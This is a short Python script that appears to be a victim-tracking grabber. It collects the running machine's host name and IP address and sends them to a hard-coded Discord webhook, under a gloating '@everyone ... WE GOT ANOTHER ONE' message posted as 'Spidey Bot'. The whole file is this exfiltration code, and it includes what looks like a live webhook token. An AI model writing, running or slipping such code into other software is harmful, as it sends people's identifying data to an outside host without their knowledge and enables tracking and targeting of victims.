import socket
host_name = socket.gethostname()
ip_address = socket.gethostbyname(host_name)
print("Host name: ", host_name)
print("IP Address: ", ip_address)

from discord_webhook import DiscordWebhook, DiscordEmbed
content = "# @everyone LMFAOOO WE GOT ANOTHER ONE"
webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1304490243910533172/ceZNHL_lfpNCSL4MF4HbR_l7cam-Q2Sxc3hSL7iRAiA8KNL9TZ8e0ygQfnZ9KSafXQxS", username="Spidey Bot", content=content)
embed = DiscordEmbed(title="IP: " + ip_address + " | Host: " + host_name, color = 123213)
webhook.add_embed(embed)
response = webhook.execute()
